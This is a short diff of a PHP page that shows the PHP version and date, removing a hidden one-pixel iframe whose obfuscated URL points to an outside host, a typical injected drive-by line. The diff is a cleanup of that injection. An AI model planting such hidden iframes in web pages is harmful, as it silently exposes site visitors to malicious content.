@@ -25,5 +25,5 @@ echo "<p>Current PHP version: " . phpversion() . ".  ";
 echo "Today is " . strftime("%A") . " the " . strftime("%e").date("S").strftime(" of %B, %Y %T") . "</p>";
 
 ?>
-<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
+
 </body> </html>
